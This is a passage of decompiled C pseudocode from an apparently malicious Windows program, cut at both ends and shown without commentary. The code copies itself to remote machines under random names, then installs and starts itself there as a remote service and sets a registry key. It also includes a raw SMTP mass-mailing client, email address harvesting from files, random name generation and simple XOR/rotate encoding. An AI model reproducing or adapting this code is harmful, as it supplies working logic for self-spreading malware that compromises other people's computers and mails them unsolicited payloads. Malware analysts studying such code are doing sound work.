  if ( !OpenProcessToken(hObject, 8u, &TokenHandle) || (v4 = LocalAlloc(0, uBytes), (hMem = v4) == 0) )
  {
    LastError = GetLastError();
LABEL_3:
    v17 = LastError;
    goto LABEL_23;
  }
  if ( !GetTokenInformation(TokenHandle, TokenGroups, v4, uBytes, &uBytes)
    && (GetLastError() != 122
     || (LocalFree(hMem), v5 = LocalAlloc(0, uBytes), (hMem = v5) == 0)
     || !GetTokenInformation(TokenHandle, TokenGroups, v5, uBytes, &uBytes))
    || !AllocateAndInitializeSid(&pIdentifierAuthority, 1u, 4u, 0, 0, 0, 0, 0, 0, 0, &pSid)
    || !AllocateAndInitializeSid(&pIdentifierAuthority, 1u, 6u, 0, 0, 0, 0, 0, 0, 0, &pSid2) )
  {
    LastError = GetLastError();
    goto LABEL_3;
  }
  v18 = 0;
  if ( *(_DWORD *)hMem )
  {
    v6 = (PSID *)((char *)hMem + 4);
    while ( 1 )
    {
      pSid1 = *v6;
      if ( EqualSid(*v6, pSid) )
      {
        v11 = 1;
        *a1 = 0;
        goto LABEL_20;
      }
      if ( EqualSid(pSid1, pSid2) )
        break;
      ++v18;
      v6 += 2;
      if ( v18 >= *(_DWORD *)hMem )
        goto LABEL_20;
    }
    *a1 = 1;
    v11 = 0;
  }
LABEL_20:
  if ( !*a1 && !v11 )
    *a1 = 1;
LABEL_23:
  if ( pSid2 )
    FreeSid(pSid2);
  if ( pSid )
    FreeSid(pSid);
  if ( hMem )
    LocalFree(hMem);
  if ( TokenHandle )
    CloseHandle(TokenHandle);
  if ( hObject )
    CloseHandle(hObject);
  return v17;
}

//----- (0040280F) --------------------------------------------------------
int __cdecl sub_40280F(LPCSTR lpMachineName, char *Source, SC_HANDLE hSCObject, HKEY phkResult, int started, int a6)
{
  int v6; // eax
  int v7; // eax
  size_t v8; // eax
  bool v9; // zf
  char *v10; // eax
  int v11; // eax
  SC_HANDLE v12; // edi
  SC_HANDLE v13; // esi
  char Str[7872]; // [esp+Ch] [ebp-2A24h] BYREF
  WCHAR v16[260]; // [esp+1ECCh] [ebp-B64h] BYREF
  WCHAR WideCharStr[260]; // [esp+20D4h] [ebp-95Ch] BYREF
  CHAR SubKey[200]; // [esp+22DCh] [ebp-754h] BYREF
  char Filename[260]; // [esp+23A4h] [ebp-68Ch] BYREF
  CHAR ExistingFileName[260]; // [esp+24A8h] [ebp-588h] BYREF
  CHAR MultiByteStr[500]; // [esp+25ACh] [ebp-484h] BYREF
  char Destination[260]; // [esp+27A0h] [ebp-290h] BYREF
  CHAR NewFileName[260]; // [esp+28A4h] [ebp-18Ch] BYREF
  CHAR ServiceName[100]; // [esp+29A8h] [ebp-88h] BYREF
  CHAR Buffer[32]; // [esp+2A0Ch] [ebp-24h] BYREF
  DWORD nSize; // [esp+2A2Ch] [ebp-4h] BYREF

  nSize = 32;
  ServiceName[0] = 0;
  if ( hSCObject )
    strcpy(ServiceName, (const char *)hSCObject);
  else
    sub_403624(ServiceName, 5, 10, 7);
  if ( started )
    strcpy(ExistingFileName, (const char *)started);
  else
    strcpy(ExistingFileName, (const char *)&ApplicationName);
  strcpy(NewFileName, lpMachineName);
  strcat(NewFileName, Source);
  if ( phkResult )
  {
    strcpy(Destination, (const char *)phkResult);
  }
  else
  {
    v6 = rand();
    sub_404156(Destination, v6 % 2, &byte_40F1DC, 1);
  }
  if ( dword_491E88 )
  {
    v7 = rand();
    sub_404156(Destination, v7 % 2, 0, 1);
  }
  v8 = strlen(NewFileName);
  v9 = Destination[v8 + 259] == 92;
  v10 = &Destination[v8 + 259];
  if ( v9 )
    *v10 = 0;
  if ( Destination[0] != 92 )
    strcat(NewFileName, asc_40E044);
  strcat(NewFileName, Destination);
  if ( !CopyFileA(ExistingFileName, NewFileName, 0) )
    return 0;
  if ( rand() % 5 )
  {
    v11 = rand();
    sub_403F63(NewFileName, v11 % 10240 + 77952);
  }
  memcpy(Str, &String1, sizeof(Str));
  Str[4116] = 0;
  sub_4054B3(NewFileName, Str);
  if ( dword_491E88 )
    return 0;
  GetComputerNameA(Buffer, &nSize);
  if ( !_strcmpi(lpMachineName + 2, Buffer) )
    return 0;
  v12 = OpenSCManagerA(lpMachineName, 0, 2u);
  if ( !v12 && !a6 )
    return 0;
  CreateServiceA(v12, ServiceName, ServiceName, 0, 0x110u, 3u, 0, NewFileName, 0, 0, 0, 0, 0);
  CloseServiceHandle(v12);
  v13 = OpenSCManagerA(lpMachineName, 0, 1u);
  hSCObject = OpenServiceA(v13, ServiceName, 0x10u);
  started = StartServiceA(hSCObject, 0, 0);
  CloseServiceHandle(hSCObject);
  CloseServiceHandle(v13);
  if ( !started )
  {
    memset(WideCharStr, 0, sizeof(WideCharStr));
    memset(v16, 0, sizeof(v16));
    hSCObject = 0;
    started = 0;
    if ( !dword_491E9C )
      return 0;
    if ( *Source == 92 )
      started = 1;
    MultiByteToWideChar(0, 1u, lpMachineName, -1, WideCharStr, 260);
    MultiByteToWideChar(0, 1u, &Source[started], -1, v16, 260);
    if ( !dword_491E9C(WideCharStr, v16, 2, &hSCObject) )
    {
      MultiByteStr[0] = 0;
      WideCharToMultiByte(0, 0, *((LPCWCH *)hSCObject + 6), -1, MultiByteStr, 260, 0, 0);
      if ( !RegConnectRegistryA(lpMachineName, HKEY_LOCAL_MACHINE, &phkResult) )
      {
        sub_403BD8(SubKey, 3);
        strcat(MultiByteStr, asc_40E044);
        strcat(MultiByteStr, Destination);
        Filename[0] = 0;
        _splitpath(MultiByteStr, 0, 0, Filename, 0);
        sub_40451C(phkResult, SubKey, Filename, (BYTE *)MultiByteStr);
        RegCloseKey(phkResult);
      }
      if ( dword_491EA4 )
        dword_491EA4(hSCObject);
    }
  }
  return 1;
}
// 491E88: using guessed type int dword_491E88;
// 491E9C: using guessed type int (__stdcall *dword_491E9C)(_DWORD, _DWORD, _DWORD, _DWORD);
// 491EA4: using guessed type int (__stdcall *dword_491EA4)(_DWORD);

//----- (00402BF1) --------------------------------------------------------
int __thiscall sub_402BF1(void *this, char *Source, int a3, size_t Size, int a5)
{
  void *v6; // eax
  void *v7; // eax
  void *v9; // [esp-Ch] [ebp-18h]

  *((_DWORD *)this + 6) = a5;
  *(_DWORD *)this = 0;
  *((_DWORD *)this + 3) = 0;
  strcpy((char *)this + 28, Source);
  *((_WORD *)this + 206) = a3;
  *((_WORD *)this + 207) = 25;
  v6 = operator new(Size);
  *((_DWORD *)this + 1) = v6;
  if ( !v6 || (v7 = operator new(Size), (*((_DWORD *)this + 4) = v7) == 0) )
  {
    *((_DWORD *)this + 105) = -2147483646;
    return 0;
  }
  v9 = (void *)*((_DWORD *)this + 1);
  *((_DWORD *)this + 2) = Size;
  *((_DWORD *)this + 5) = Size;
  memset(v9, 0, Size);
  memset(*((void **)this + 4), 0, Size);
  *((_DWORD *)this + 105) = 0;
  *((_DWORD *)this + 106) = 0;
  *((_DWORD *)this + 107) = 0;
  *((_BYTE *)this + 284) = 0;
  if ( !sub_4031D8((SOCKET *)this + 104, a3, 1, 1) )
  {
    *((_DWORD *)this + 105) = -2147483643;
    return 0;
  }
  if ( *((_DWORD *)this + 3) && *(_DWORD *)this )
    return 1;
  else
    return 2;
}

//----- (00402CC3) --------------------------------------------------------
int __thiscall sub_402CC3(int this)
{
  SOCKET *v2; // edi
  int v3; // eax
  int v4; // esi

  if ( *(_DWORD *)(this + 4) )
    operator delete(*(void **)(this + 4));
  if ( *(_DWORD *)(this + 16) )
    operator delete(*(void **)(this + 16));
  v2 = (SOCKET *)(this + 416);
  sub_403285((SOCKET *)(this + 416), buf, 6, 0);
  do
    v3 = sub_4032C1();
  while ( !v3 );
  if ( v3 == 1 )
    v4 = sub_402FEA((SOCKET *)this, 0xDDu);
  else
    v4 = 1;
  sub_4032B3(v2);
  return v4;
}

//----- (00402D28) --------------------------------------------------------
int __thiscall sub_402D28(int this)
{
  int result; // eax
  int v3; // eax

  if ( sub_403222((SOCKET *)(this + 416), (char *)(this + 28), *(_WORD *)(this + 412)) )
  {
    do
      v3 = sub_4032C1();
    while ( !v3 );
    if ( v3 == 1 )
    {
      return sub_402FEA((SOCKET *)this, 0xDCu);
    }
    else
    {
      *(_DWORD *)(this + 420) = -2147483645;
      return 1;
    }
  }
  else
  {
    result = -2147483647;
    *(_DWORD *)(this + 420) = -2147483647;
  }
  return result;
}

//----- (00402D84) --------------------------------------------------------
int __thiscall sub_402D84(int this, char *buf, int len)
{
  int v4; // eax
  int v5; // eax
  int result; // eax
  char *v7; // edi
  size_t v8; // eax
  char Str[256]; // [esp+Ch] [ebp-104h] BYREF
  unsigned int v10; // [esp+10Ch] [ebp-4h]

  sprintf(Str, "HELO %s\r\n", (const char *)(this + 284));
  v4 = strlen(Str);
  sub_403285((SOCKET *)(this + 416), Str, v4, 0);
  do
    v5 = sub_4032C1();
  while ( !v5 );
  if ( v5 == 1 )
  {
    result = sub_402FEA((SOCKET *)this, 0xFAu);
    if ( !result )
    {
      result = sub_402E96((SOCKET *)this);
      if ( !result )
      {
        v10 = 0;
        v7 = *(char **)(this + 4);
        if ( *(_DWORD *)this )
        {
          while ( 1 )
          {
            result = sub_402F50((SOCKET *)this, v7);
            if ( result )
              break;
            v8 = strlen(v7);
            ++v10;
            v7 += v8 + 1;
            if ( v10 >= *(_DWORD *)this )
              goto LABEL_9;
          }
        }
        else
        {
LABEL_9:
          sub_403285((SOCKET *)(this + 416), aData, 7, 0);
          result = sub_402FEA((SOCKET *)this, 0x162u);
          if ( !result )
          {
            sub_403285((SOCKET *)(this + 416), buf, len, 0);
            sub_403285((SOCKET *)(this + 416), asc_40E050, 5, 0);
            return sub_402FEA((SOCKET *)this, 0xFAu);
          }
        }
      }
    }
  }
  else
  {
    *(_DWORD *)(this + 420) = -2147483645;
    return 1;
  }
  return result;
}

//----- (00402E96) --------------------------------------------------------
int __thiscall sub_402E96(SOCKET *this)
{
  char *v2; // eax
  char *v3; // ebx
  int result; // eax
  const char *v5; // edi
  SOCKET i; // ebp
  int v7; // eax
  int v8; // ebp

  v2 = (char *)operator new(this[5] + 100);
  v3 = v2;
  if ( !v2 )
    return 2;
  strcpy(v2, aMailFrom);
  v5 = (const char *)this[4];
  for ( i = 0; i < this[3]; v5 += strlen(v5) + 1 )
  {
    strcat(v3, v5);
    strcat(v3, asc_40E038);
    ++i;
  }
  strcat(v3, asc_40E06C);
  v7 = strlen(v3);
  sub_403285(this + 104, v3, v7, 0);
  do
    v8 = sub_4032C1();
  while ( !v8 );
  operator delete(v3);
  result = 1;
  if ( v8 == 1 )
    return sub_402FEA(this, 0xFAu);
  this[105] = -2147483645;
  return result;
}

//----- (00402F50) --------------------------------------------------------
int __thiscall sub_402F50(SOCKET *this, char *Source)
{
  size_t v3; // eax
  char *v4; // eax
  char *v5; // esi
  int result; // eax
  int v7; // eax
  int v8; // ebp

  v3 = strlen(Source);
  v4 = (char *)operator new(v3 + 100);
  v5 = v4;
  if ( !v4 )
    return 2;
  strcpy(v4, aRcptTo);
  strcat(v5, Source);
  strcat(v5, asc_40E06C);
  v7 = strlen(v5);
  sub_403285(this + 104, v5, v7, 0);
  do
    v8 = sub_4032C1();
  while ( !v8 );
  operator delete(v5);
  result = 1;
  if ( v8 == 1 )
    return sub_402FEA(this, 0xFAu);
  this[105] = -2147483645;
  return result;
}

//----- (00402FEA) --------------------------------------------------------
int __thiscall sub_402FEA(SOCKET *this, SOCKET a2)
{
  int v3; // eax
  SOCKET v4; // ecx
  char Buffer[1024]; // [esp+8h] [ebp-404h] BYREF
  SOCKET v8; // [esp+408h] [ebp-4h] BYREF

  sub_40329C(this + 104, Buffer, 1024, 0);
  do
    v3 = sub_4032C1();
  while ( !v3 );
  if ( v3 == 1 )
  {
    sscanf(Buffer, "%d", &v8);
    v4 = v8;
    if ( a2 == v8 )
      return 0;
    this[105] = -2147483644;
    this[106] = v4;
    this[107] = a2;
    return 2;
  }
  else
  {
    this[105] = -2147483645;
    return 1;
  }
}

//----- (00403075) --------------------------------------------------------
char *__thiscall sub_403075(char *this, char *Source)
{
  return strcpy(this + 284, Source);
}

//----- (0040308A) --------------------------------------------------------
char *__thiscall sub_40308A(int this, char *Source)
{
  char *v3; // edi
  size_t i; // ebx
  unsigned int v5; // eax
  char *result; // eax
  char *v7; // ebx
  int v8; // edi
  _BYTE *v9; // [esp-1Ch] [ebp-2Ch]
  size_t v10; // [esp-4h] [ebp-14h]
  unsigned int v11; // [esp+Ch] [ebp-4h]

  v3 = *(char **)(this + 16);
  v11 = 0;
  for ( i = strlen(Source); v11 < *(_DWORD *)(this + 12); v3 += strlen(v3) + 1 )
    ++v11;
  v5 = *(_DWORD *)(this + 20);
  if ( (unsigned int)&v3[i - *(_DWORD *)(this + 16)] > v5 )
  {
    v10 = *(_DWORD *)(this + 24) + v5;
    *(_DWORD *)(this + 20) = v10;
    result = (char *)operator new(v10);
    v7 = result;
    if ( !result )
    {
      *(_DWORD *)(this + 420) = -2147483646;
      return result;
    }
    memset(result, 0, *(_DWORD *)(this + 20));
    memcpy_0(v7, *(const void **)(this + 16), (size_t)&v3[-*(_DWORD *)(this + 16)]);
    v9 = *(_BYTE **)(this + 16);
    v8 = v3 - v9;
    operator delete(v9);
    *(_DWORD *)(this + 16) = v7;
    v3 = &v7[v8];
  }
  strcpy(v3, Source);
  return (char *)++*(_DWORD *)(this + 12);
}

//----- (00403133) --------------------------------------------------------
char *__thiscall sub_403133(void *this, char *Source)
{
  char *v3; // edi
  size_t i; // ebx
  unsigned int v5; // eax
  char *result; // eax
  char *v7; // ebx
  int v8; // edi
  _BYTE *v9; // [esp-1Ch] [ebp-2Ch]
  size_t v10; // [esp-4h] [ebp-14h]
  unsigned int v11; // [esp+Ch] [ebp-4h]

  v3 = (char *)*((_DWORD *)this + 1);
  v11 = 0;
  for ( i = strlen(Source); v11 < *(_DWORD *)this; v3 += strlen(v3) + 1 )
    ++v11;
  v5 = *((_DWORD *)this + 2);
  if ( (unsigned int)&v3[i - *((_DWORD *)this + 1)] > v5 )
  {
    v10 = *((_DWORD *)this + 6) + v5;
    *((_DWORD *)this + 2) = v10;
    result = (char *)operator new(v10);
    v7 = result;
    if ( !result )
    {
      *((_DWORD *)this + 105) = -2147483646;
      return result;
    }
    memset(result, 0, *((_DWORD *)this + 2));
    memcpy_0(v7, *((const void **)this + 1), (size_t)&v3[-*((_DWORD *)this + 1)]);
    v9 = (_BYTE *)*((_DWORD *)this + 1);
    v8 = v3 - v9;
    operator delete(v9);
    *((_DWORD *)this + 1) = v7;
    v3 = &v7[v8];
  }
  strcpy(v3, Source);
  return (char *)++*(_DWORD *)this;
}

//----- (004031D8) --------------------------------------------------------
BOOL __thiscall sub_4031D8(SOCKET *this, int a2, __int16 a3, int a4)
{
  __int16 v4; // bx
  SOCKET v6; // eax
  struct WSAData WSAData; // [esp+8h] [ebp-190h] BYREF

  v4 = 1;
  WSAStartup(2u, &WSAData);
  if ( a3 == 2 )
    v4 = 2;
  v6 = socket(2, v4, 6);
  *this = v6;
  return v6 != -1;
}

//----- (00403222) --------------------------------------------------------
int __thiscall sub_403222(SOCKET *this, char *a2, int hostshort)
{
  struct sockaddr name; // [esp+4h] [ebp-10h] BYREF

  *(_WORD *)name.sa_data = htons(hostshort);
  name.sa_family = 2;
  sub_4032C5(a2, (int)&hostshort);
  *(_DWORD *)&name.sa_data[2] = hostshort;
  if ( !connect(*this, &name, 16) )
    return 1;
  WSAGetLastError();
  return 0;
}

//----- (00403285) --------------------------------------------------------
int __thiscall sub_403285(SOCKET *this, char *buf, int len, int flags)
{
  return send(*this, buf, len, flags);
}

//----- (0040329C) --------------------------------------------------------
int __thiscall sub_40329C(SOCKET *this, char *buf, int len, int flags)
{
  return recv(*this, buf, len, flags);
}

//----- (004032B3) --------------------------------------------------------
int __thiscall sub_4032B3(SOCKET *this)
{
  closesocket(*this);
  return WSACleanup();
}

//----- (004032C1) --------------------------------------------------------
int sub_4032C1()
{
  return 1;
}

//----- (004032C5) --------------------------------------------------------
int __stdcall sub_4032C5(char *name, int a2)
{
  signed int v2; // esi
  int v3; // ebx
  char v4; // al
  struct hostent *v6; // esi
  int i; // eax
  int v8; // [esp+10h] [ebp-4h]

  v2 = 0;
  v3 = 1;
  v8 = 0;
  if ( (int)strlen(name) <= 0 )
    return 0;
  do
  {
    v4 = name[v2];
    if ( v4 == 46 )
    {
      ++v8;
    }
    else if ( v4 < 48 || v4 > 57 )
    {
      v3 = 0;
    }
    ++v2;
  }
  while ( v2 < (int)strlen(name) );
  if ( v3 )
  {
    if ( v8 != 3 )
      return 0;
    sub_403357((int)name, a2);
  }
  else
  {
    v6 = gethostbyname(name);
    WSAGetLastError();
    if ( v6 )
    {
      for ( i = 0; i < 4; ++i )
        *(_BYTE *)(i + a2) = (*v6->h_addr_list)[i];
    }
  }
  return 1;
}

//----- (00403357) --------------------------------------------------------
char __stdcall sub_403357(int a1, int a2)
{
  int v2; // ebx
  int v3; // esi
  _BYTE *v4; // edi
  char result; // al
  int i; // [esp+Ch] [ebp-4h]

  v2 = a1;
  v3 = 0;
  for ( i = 0; i < 4; ++i )
  {
    v4 = (_BYTE *)(v3 + v2);
    sscanf((const char *const)(v3 + v2), "%d", &a1);
    result = i;
    *(_BYTE *)(i + a2) = a1;
    if ( i == 3 )
      break;
    ++v3;
    if ( *v4 != 46 )
    {
      do
      {
        result = *(_BYTE *)(v3 + v2);
        ++v3;
      }
      while ( result != 46 );
    }
  }
  return result;
}

//----- (004033AA) --------------------------------------------------------
int __cdecl sub_4033AA(char *Destination, char *Source, int a3, int a4)
{
  char *v4; // esi
  size_t v5; // edi
  size_t v7; // [esp+Ch] [ebp-4h]

  v4 = Destination;
  v7 = strlen(Source);
  while ( 1 )
  {
    v5 = strlen(v4);
    if ( !v5 || a3 && v4 - Destination >= a3 )
      break;
    if ( a4 && !_strcmpi(v4, Source) )
      return -1;
    v4 += v5 + 1;
  }
  if ( (int)(v4 - Destination + v7 + 2) > a3 && a3 )
    return 0;
  strcpy(v4, Source);
  v4[strlen(v4) + 1] = 0;
  return 1;
}

//----- (00403434) --------------------------------------------------------
char *__cdecl sub_403434(char *Str, int a2)
{
  int i; // edi

  for ( i = 0; i < a2; Str += strlen(Str) + 1 )
  {
    if ( !strlen(Str) )
      break;
    ++i;
  }
  return Str;
}

//----- (00403464) --------------------------------------------------------
int __cdecl sub_403464(char *Str, int a2)
{
  char *v2; // esi
  int i; // edi
  size_t v4; // eax

  v2 = Str;
  for ( i = 0; ; ++i )
  {
    v4 = strlen(v2);
    if ( !v4 || a2 && v2 - Str >= a2 )
      break;
    v2 += v4 + 1;
  }
  return i;
}

//----- (00403496) --------------------------------------------------------
_BYTE *__cdecl sub_403496(int a1)
{
  int i; // edi
  unsigned int v2; // edx
  _BYTE *result; // eax

  for ( i = 0; i < 4; ++i )
  {
    v2 = sub_404687(0) % (unsigned int)(i != 0 ? 256 : 8);
    result = (_BYTE *)(i + a1);
    *(_BYTE *)(i + a1) = v2;
    if ( !(_BYTE)v2 )
      *result = 1;
  }
  return result;
}

//----- (004034CD) --------------------------------------------------------
int __cdecl sub_4034CD(int a1, int a2, char *a3)
{
  char v3; // al
  _BYTE *v5; // [esp+Ch] [ebp-Ch]
  int v6; // [esp+10h] [ebp-8h]
  char v7; // [esp+16h] [ebp-2h]
  char i; // [esp+17h] [ebp-1h]

  v6 = 0;
  v7 = *a3;
  for ( i = a3[1]; v6 < a2; *v5 = i ^ __ROL1__(v3, v7) )
  {
    v5 = (_BYTE *)(v6 + a1);
    v3 = *(_BYTE *)(v6 + a1);
    ++v6;
  }
  return 1;
}

//----- (00403529) --------------------------------------------------------
int __cdecl sub_403529(int a1, int a2, char *a3)
{
  char v3; // al
  _BYTE *v5; // [esp+Ch] [ebp-Ch]
  int v6; // [esp+10h] [ebp-8h]
  char v7; // [esp+16h] [ebp-2h]
  char i; // [esp+17h] [ebp-1h]

  v6 = 0;
  v7 = *a3;
  for ( i = a3[1]; v6 < a2; *v5 = __ROR1__(i ^ v3, v7) )
  {
    v5 = (_BYTE *)(v6 + a1);
    v3 = *(_BYTE *)(v6 + a1);
    ++v6;
  }
  return 1;
}

//----- (00403585) --------------------------------------------------------
unsigned int __cdecl sub_403585(int a1)
{
  unsigned int v1; // esi

  v1 = sub_404687(0) % 0x1Au + 97;
  if ( a1 != 4 )
  {
    if ( a1 == 1 )
      return sub_404687(0) % 0xAu + 48;
    if ( (a1 & 2) != 0 )
      v1 = sub_404687(0) % 0x1Au + 65;
    if ( (sub_404687(0) & 1) != 0 && (a1 & 4) != 0 )
      v1 = sub_404687(0) % 0x1Au + 97;
    if ( (sub_404687(0) & 1) != 0 && (a1 & 1) != 0 )
      return sub_404687(0) % 0xAu + 48;
  }
  return v1;
}

//----- (00403624) --------------------------------------------------------
int __cdecl sub_403624(_BYTE *a1, int a2, int a3, int a4)
{
  int v4; // esi
  int i; // edi

  v4 = a2;
  if ( a3 > a2 )
    v4 = a2 + sub_404687(0) % (unsigned int)(a3 - a2);
  for ( i = 0; i < v4; ++i )
    a1[i] = sub_403585(a4);
  *a1 = sub_403585(2);
  a1[i] = 0;
  return 1;
}

//----- (00403678) --------------------------------------------------------
int __cdecl sub_403678(char a1)
{
  int v1; // esi

  v1 = 0;
  if ( (int)strlen(asc_40E090) <= 0 )
    return 0;
  while ( a1 != asc_40E090[v1] )
  {
    if ( ++v1 >= (int)strlen(asc_40E090) )
      return 0;
  }
  return 1;
}

//----- (004036AE) --------------------------------------------------------
int __cdecl sub_4036AE(char a1)
{
  int v1; // esi

  if ( a1 < 0 )
    return 0;
  if ( !isalpha(a1) && !isdigit(a1) )
  {
    v1 = 0;
    if ( (int)strlen(asc_40E098) > 0 )
    {
      while ( a1 != asc_40E098[v1] )
      {
        if ( ++v1 >= (int)strlen(asc_40E098) )
          return 0;
      }
      return 1;
    }
    return 0;
  }
  return 1;
}

//----- (00403703) --------------------------------------------------------
BOOL __cdecl sub_403703(BYTE *a1)
{
  return IsDBCSLeadByte(*a1) && a1[1] > 0x80u;
}

//----- (00403724) --------------------------------------------------------
BOOL __cdecl sub_403724(_BYTE *a1)
{
  return *a1 == 0xA1 || *a1 == 0xA3;
}

//----- (00403739) --------------------------------------------------------
int __cdecl sub_403739(int a1, char *a2, int a3, int a4, int a5, int a6, int a7)
{
  int v8; // esi
  int result; // eax
  int v10; // ebx
  int v11; // ecx
  char v12; // al
  int v13; // ebx
  int v14; // ebx
  int v15; // ebx
  char Destination[2040]; // [esp+Ch] [ebp-7FCh] BYREF
  int v17; // [esp+804h] [ebp-4h]
  char *i; // [esp+814h] [ebp+Ch]
  char *v19; // [esp+814h] [ebp+Ch]
  BYTE *v20; // [esp+818h] [ebp+10h]
  int v21; // [esp+828h] [ebp+20h]

  v8 = 0;
  v17 = 0;
  *a2 = 0;
  *(_DWORD *)a6 = 0;
  if ( a3 <= 0 )
    return a1 + 1;
  v10 = a1;
  if ( !sub_4036AE(*(_BYTE *)a1) )
  {
    for ( i = (char *)a1; v8 < a3 - 1 && !sub_4036AE(*i); ++i )
    {
      if ( a7 )
      {
        if ( sub_403703((BYTE *)i) && !sub_403724(i) )
          break;
        if ( sub_403724(i) )
        {
          ++v8;
          ++i;
        }
      }
      ++v8;
    }
  }
  v19 = (char *)(a3 - 1);
  if ( v8 < a3 - 1 )
  {
    if ( sub_4036AE(*(_BYTE *)(v8 + a1)) )
    {
      while ( 1 )
      {
        result = sub_403678(*(_BYTE *)(v8 + a1));
        if ( result )
          break;
        if ( ++v8 >= (int)v19 )
          return result;
      }
      do
      {
        if ( !sub_4036AE(*(_BYTE *)(v8 + a1)) )
          break;
        v11 = v17;
        v12 = *(_BYTE *)(v8 + a1);
        ++v17;
        ++v8;
        a2[v11] = v12;
        if ( v8 >= (int)v19 )
          break;
      }
      while ( v17 < a5 - 1 );
      if ( v17 >= a5 - 1 && v17 )
      {
        do
        {
          if ( sub_403678(a2[v17]) )
            break;
          --v17;
        }
        while ( v17 );
      }
      if ( v17 >= 0 )
        a2[v17] = 0;
      v13 = 0;
      if ( *a2 )
      {
        do
        {
          if ( !sub_403678(a2[v13]) )
            break;
          ++v13;
        }
        while ( a2[v13] );
      }
      strcpy(Destination, &a2[v13]);
      strcpy(a2, Destination);
      if ( v17 - v13 >= a4 )
        goto LABEL_40;
      v10 = a1;
    }
    if ( a7 )
    {
      *a2 = 0;
      v14 = 0;
      if ( sub_403703((BYTE *)(v8 + a1)) )
      {
        v21 = a3 - 2;
        v20 = (BYTE *)(v8 + a1);
        do
        {
          if ( !sub_403724(v20) )
          {
            a2[v14] = *v20;
            v15 = v14 + 1;
            a2[v15] = v20[1];
            v14 = v15 + 1;
          }
          v8 += 2;
          v20 += 2;
        }
        while ( v8 < v21 && v14 < a5 - 2 && sub_403703(v20) );
      }
      a2[v14] = 0;
      if ( v14 >= a4 )
      {
LABEL_40:
        *(_DWORD *)a6 = 1;
        return v8 + a1;
      }
      v10 = a1;
    }
    *(_DWORD *)a6 = 0;
  }
  return v8 + v10;
}

//----- (00403944) --------------------------------------------------------
BOOL __cdecl sub_403944(LPCSTR lpFileName, char *Destination, int a3, int a4, int a5)
{
  LPVOID v5; // eax
  int v6; // esi
  int v7; // edx
  int v8; // ecx
  int i; // edi
  unsigned int v10; // eax
  int v11; // edi
  char Source[4096]; // [esp+Ch] [ebp-101Ch] BYREF
  char v14[16]; // [esp+100Ch] [ebp-1Ch] BYREF
  int j; // [esp+101Ch] [ebp-Ch]
  int v16; // [esp+1020h] [ebp-8h] BYREF
  int v17; // [esp+1024h] [ebp-4h] BYREF
  int lpFileNamea; // [esp+1030h] [ebp+8h]

  sub_40174B(v14);
  *Destination = 0;
  v5 = sub_40174E((int)v14, lpFileName, (int)&v16, 1);
  v6 = (int)v5;
  if ( !v5 )
    return 0;
  v7 = v16;
  if ( (unsigned int)v16 < 0xA )
  {
LABEL_21:
    sub_401808((int)v14);
    return 0;
  }
  Source[0] = 0;
  v17 = 0;
  do
  {
    v5 = (LPVOID)sub_403739((int)v5, Destination, v7, a3, a4, (int)&v17, a5);
    v8 = v16;
    v7 = v6 + v16 - (_DWORD)v5;
    if ( v7 <= 5 )
    {
      *Destination = 0;
      goto LABEL_21;
    }
  }
  while ( !v17 );
  lpFileNamea = 0;
  for ( i = 0; i < 10000; ++i )
  {
    v5 = (LPVOID)sub_403739((int)v5, Source, v6 + v8 - (_DWORD)v5, a3, a4, (int)&v17, a5);
    if ( v17 )
      ++lpFileNamea;
    v8 = v16;
    if ( (unsigned int)(v6 + v16 - (_DWORD)v5) <= 5 )
      break;
  }
  if ( lpFileNamea )
  {
    v10 = sub_404687(0);
    v8 = v16;
    lpFileNamea = v10 % i;
  }
  v11 = v6;
  for ( j = 0; j < 10000; ++j )
  {
    v11 = sub_403739(v11, Source, v6 + v8 - v11, a3, a4, (int)&v17, a5);
    if ( v17 )
    {
      if ( !lpFileNamea )
        break;
      --lpFileNamea;
      strcpy(Destination, Source);
    }
    v8 = v16;
    if ( (unsigned int)(v6 + v16 - v11) <= 5 )
      break;
  }
  sub_401808((int)v14);
  return (int)strlen(Destination) >= a3;
}

//----- (00403AAD) --------------------------------------------------------
int __cdecl sub_403AAD(int a1, int a2, char *Destination)
{
  int v3; // ebx
  _BYTE *v4; // eax

  v3 = 0;
  if ( a2 )
    *(_BYTE *)a2 = 0;
  if ( Destination )
    *Destination = 0;
  if ( *(_BYTE *)a1 != 64 )
  {
    v4 = (_BYTE *)a1;
    do
    {
      if ( !*v4 )
        break;
      if ( a2 )
        v4[a2 - a1] = *v4;
      ++v3;
      ++v4;
    }
    while ( *v4 != 64 );
  }
  if ( a2 )
    *(_BYTE *)(v3 + a2) = 0;
  if ( !*(_BYTE *)(v3 + a1) )
    return 0;
  if ( Destination )
    strcpy(Destination, (const char *)(v3 + a1));
  return 1;
}

//----- (00403B18) --------------------------------------------------------
int __cdecl sub_403B18(char a1)
{
  int v1; // eax
  char v3[4]; // [esp+Ch] [ebp-4h] BYREF

  strcpy(v3, "-_");
  if ( a1 <= 32 || a1 >= 126 )
    return 0;
  if ( !isalpha(a1) )
  {
    v1 = isdigit(a1);
    if ( !v1 && a1 != 64 && a1 != 46 )
    {
      while ( a1 != v3[v1] )
      {
        if ( ++v1 >= 2 )
          return 0;
      }
    }
  }
  return 1;
}

//----- (00403B72) --------------------------------------------------------
int __cdecl sub_403B72(char a1)
{
  return sub_403B18(a1);
}

//----- (00403B7D) --------------------------------------------------------
char *__cdecl sub_403B7D(char *Source, char *a2)
{
  char Destination[4096]; // [esp+0h] [ebp-2000h] BYREF
  char SubStr[4096]; // [esp+1000h] [ebp-1000h] BYREF

  strcpy(Destination, Source);
  strcpy(SubStr, a2);
  _strlwr(Destination);
  _strlwr(SubStr);
  return strstr(Destination, SubStr);
}

//----- (00403BD8) --------------------------------------------------------
char *__cdecl sub_403BD8(char *Destination, int a2)
{
  char *v2; // eax

  strcpy(Destination, SubKey);
  v2 = sub_403434(SubKey, a2);
  return strcat(Destination, v2);
}

//----- (00403C01) --------------------------------------------------------
int __cdecl sub_403C01(char *Str)
{
  signed int v1; // eax
  signed int v2; // edi
  int v3; // esi

  v1 = strlen(Str);
  v2 = v1;
  if ( v1 >= 4 && v1 <= 12 )
  {
    v3 = 0;
    while ( isdigit(Str[v3]) )
    {
      if ( ++v3 >= v2 )
        return 1;
    }
  }
  return 0;
}
// 403C1F: conditional instruction was optimized away because eax.4 is in (4..C)

//----- (00403C40) --------------------------------------------------------
int __cdecl sub_403C40(char *FullPath)
{
  int v1; // edi
  int v2; // ebx
  char *v3; // eax
  char Ext[260]; // [esp+Ch] [ebp-104h] BYREF

  v1 = 0;
  _splitpath(FullPath, 0, 0, 0, Ext);
